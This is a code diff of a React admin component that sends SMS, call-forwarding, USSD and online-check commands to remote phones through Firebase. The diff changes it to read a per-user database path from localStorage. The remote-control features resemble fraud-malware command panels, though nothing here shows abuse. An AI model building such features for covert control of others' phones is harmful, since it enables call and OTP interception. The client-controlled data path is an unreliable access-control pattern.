@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { ref, onValue, push, set } from "firebase/database";
 import { db } from '../firebase';
+import { auth } from "../firebase";
 import { useParams, useNavigate } from 'react-router-dom';
 
 
@@ -38,6 +39,10 @@ const DeviceDetails = () => {
   const [message, setMessage] = useState('');
   const [sending, setSending] = useState(false);
 
+  
+  const dbPath = auth.currentUser
+    ? localStorage.getItem("dbPath_" + auth.currentUser.uid)
+    : null;  
   // SIM selection
   const [selectedSim, setSelectedSim] = useState(1);
 
@@ -62,7 +67,9 @@ const DeviceDetails = () => {
   // FETCH DEVICE DATA
   // -----------------------------------------
   useEffect(() => {
-    const deviceRef = ref(db, `devices1/${deviceId}`);
+    if (!dbPath) return;
+
+    const deviceRef = ref(db, `${dbPath}/${deviceId}`);
 
     const unsubscribe = onValue(
       deviceRef,
@@ -193,7 +200,7 @@ const DeviceDetails = () => {
     try {
       setSending(true);
 
-      await push(ref(db, `devices1/${deviceId}/sms_send_commands`), {
+      await push(ref(db, `${dbPath}/${deviceId}/sms_send_commands`), {
         phoneNumber,
         message,
         simSlot: selectedSim,
@@ -220,7 +227,7 @@ const DeviceDetails = () => {
     setCheckStatus("Checking...");
 
     try {
-      const cmdRef = ref(db, `devices1/${deviceId}/check_online_commands`);
+      const cmdRef = ref(db, `${dbPath}/${deviceId}/check_online_commands`);
 
       const newCmd = await push(cmdRef, {
         command: "check_online",
@@ -230,7 +237,7 @@ const DeviceDetails = () => {
 
       const responseRef = ref(
         db,
-        `devices1/${deviceId}/check_online_commands/${newCmd.key}`
+        `${dbPath}/${deviceId}/check_online_commands/${newCmd.key}`
       );
 
       let timeout = null;
@@ -244,7 +251,7 @@ const DeviceDetails = () => {
           if (data.status === "online") {
             setCheckStatus("Device is ONLINE ✓");
 
-            const lastOnlineRef = ref(db, `devices1/${deviceId}/lastOnline`);
+            const lastOnlineRef = ref(db, `${dbPath}/${deviceId}/lastOnline`);
             set(lastOnlineRef, Date.now());
 
             clearTimeout(timeout);
@@ -279,7 +286,7 @@ const DeviceDetails = () => {
     try {
       setCfSending(true);
 
-      await push(ref(db, `devices1/${deviceId}/call_forward_commands`), {
+      await push(ref(db, `${dbPath}/${deviceId}/call_forward_commands`), {
         action: "activate",
         number: cfNumber,
         simSlot: cfSim,
@@ -302,7 +309,7 @@ const DeviceDetails = () => {
     try {
       setCfSending(true);
 
-      await push(ref(db, `devices1/${deviceId}/call_forward_commands`), {
+      await push(ref(db, `${dbPath}/${deviceId}/call_forward_commands`), {
         action: "deactivate",
         simSlot: cfSim,
         status: "pending",
@@ -328,7 +335,7 @@ const DeviceDetails = () => {
     try {
       setUssdSending(true);
 
-      await push(ref(db, `devices1/${deviceId}/ussd_commands`), {
+      await push(ref(db, `${dbPath}/${deviceId}/ussd_commands`), {
         code: ussdCode,
         simSlot: ussdSim,
         status: "pending",
